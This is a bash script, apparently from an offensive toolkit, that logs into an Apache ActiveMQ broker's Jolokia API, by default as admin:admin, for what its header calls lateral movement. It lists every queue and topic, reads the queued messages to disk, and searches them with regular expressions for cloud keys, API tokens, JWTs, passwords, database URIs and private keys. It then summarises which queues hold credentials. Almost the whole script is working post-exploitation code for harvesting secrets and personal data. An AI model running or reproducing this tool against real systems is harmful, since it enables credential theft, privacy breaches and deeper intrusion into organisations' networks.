#!/usr/bin/env bash
# activemq-queues.sh — lateral movement intel: read every queue/topic for sensitive data.
#
# Even without RCE, the queue contents themselves are often gold:
# inter-service JWTs, API tokens, user PII, internal hostnames, password reset
# emails in pending mail queues. This script enumerates and dumps messages.

set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_activemq_lib.sh"

TARGET=""
USER="admin"; PASS="admin"
OUT="./activemq-queues"
MAX_MSGS=50

while [ $# -gt 0 ]; do
    case "$1" in
        --target)    TARGET="$2"; shift 2 ;;
        --user)      USER="$2"; shift 2 ;;
        --pass)      PASS="$2"; shift 2 ;;
        --output|-o) OUT="$2"; shift 2 ;;
        --max-msgs)  MAX_MSGS="$2"; shift 2 ;;
        -h|--help)
            cat <<EOF
Usage: $0 --target host:port [--user U] [--pass P] [-o dir] [--max-msgs N]
  Reads up to --max-msgs messages from every queue and dumps them to disk.
  Searches dumped contents for credential patterns.
EOF
            exit 0 ;;
        *) err "unknown arg: $1"; exit 1 ;;
    esac
done

[ -z "$TARGET" ] && { err "--target required"; exit 1; }
parse_target "$TARGET"; [ -z "$PORT" ] && PORT=8161
mkdir -p "$OUT"

if ! jolokia_auth_works; then err "Jolokia auth failed for $USER:$PASS"; exit 2; fi
hit "Authed to $HOST:$PORT as $USER"

# 1. Broker info
log "Pulling broker info"
curl -sk -m 5 -u "$USER:$PASS" "$(jolokia_url)/read/org.apache.activemq:type=Broker,brokerName=localhost" \
    > "$OUT/broker.json"

BROKER_VERSION=$(grep -oE '"BrokerVersion":"[^"]+"' "$OUT/broker.json" | head -1 | sed 's/.*:"//; s/"$//')
BROKER_NAME=$(grep -oE '"BrokerName":"[^"]+"' "$OUT/broker.json" | head -1 | sed 's/.*:"//; s/"$//')
[ -z "$BROKER_NAME" ] && BROKER_NAME="localhost"
log "Broker: $BROKER_NAME  version: $BROKER_VERSION"

# 2. List all queues
log "Enumerating queues"
curl -sk -m 8 -u "$USER:$PASS" "$(jolokia_url)/search/org.apache.activemq:type=Broker,brokerName=$BROKER_NAME,destinationType=Queue,destinationName=*" \
    > "$OUT/queues.json"
QUEUES=$(grep -oE 'destinationName=[^,"]+' "$OUT/queues.json" | sed 's/destinationName=//' | grep -v '^\*$' | sort -u)
QCOUNT=$(echo "$QUEUES" | wc -l)
hit "$QCOUNT queues found"

# 3. List topics
log "Enumerating topics"
curl -sk -m 8 -u "$USER:$PASS" "$(jolokia_url)/search/org.apache.activemq:type=Broker,brokerName=$BROKER_NAME,destinationType=Topic,destinationName=*" \
    > "$OUT/topics.json"
TOPICS=$(grep -oE '"destinationName=[^"]+"' "$OUT/topics.json" | sed 's/"destinationName=//; s/"$//' | sort -u)
TCOUNT=$(echo "$TOPICS" | wc -l)
hit "$TCOUNT topics found"

# 4. For each queue: stats + browse messages
mkdir -p "$OUT/queues"
for q in $QUEUES; do
    [ -z "$q" ] && continue
    safe=$(echo "$q" | tr '/:.' '___')
    qdir="$OUT/queues/$safe"
    mkdir -p "$qdir"

    # Stats
    curl -sk -m 5 -u "$USER:$PASS" \
        "$(jolokia_url)/read/org.apache.activemq:type=Broker,brokerName=$BROKER_NAME,destinationType=Queue,destinationName=$q" \
        > "$qdir/stats.json"

    # Browse up to MAX_MSGS messages. Jolokia's maxCollectionSize processing
    # option caps the returned message array server-side.
    curl -sk -m 15 -u "$USER:$PASS" \
        "$(jolokia_url)/exec/org.apache.activemq:type=Broker,brokerName=$BROKER_NAME,destinationType=Queue,destinationName=$q/browseMessages()?maxCollectionSize=$MAX_MSGS" \
        > "$qdir/messages.json"

    # Quick credential pattern search on the raw response
    if grep -oEi 'glpat-[A-Za-z0-9_-]{20,}|AKIA[0-9A-Z]{16}|sk_(test|live)_[A-Za-z0-9]{16,}|xox[bp]-[A-Za-z0-9-]{10,}|eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]+|"password"\s*:\s*"[^"]{6,}|"token"\s*:\s*"[^"]{16,}|"api[_-]?key"\s*:\s*"[^"]{16,}|postgres://[^@]+:[^@]+@|BEGIN .*PRIVATE KEY' \
            "$qdir/messages.json" > "$qdir/_cred_matches.txt" 2>/dev/null
        then
        hit "  $q  credential pattern found — see $qdir/_cred_matches.txt"
        echo "$q" >> "$OUT/_queues_with_creds.txt"
    fi
done

# 5. Summary
log "Writing summary"
{
    echo "============================================================"
    echo "  ActiveMQ Lateral Intelligence"
    echo "  Broker:   $BROKER_NAME / version $BROKER_VERSION"
    echo "  Target:   $HOST:$PORT"
    echo "  Time:     $(date -Is)"
    echo "============================================================"
    echo
    echo "Queues : $QCOUNT"
    echo "Topics : $TCOUNT"
    echo
    if [ -s "$OUT/_queues_with_creds.txt" ]; then
        echo "Queues containing credential-shaped values:"
        sort -u "$OUT/_queues_with_creds.txt" | sed 's/^/  /'
    else
        echo "(no obvious credential patterns in sampled messages)"
    fi
    echo
    echo "Detailed files: $OUT/queues/<queueName>/"
} > "$OUT/SUMMARY.txt"
cat "$OUT/SUMMARY.txt"
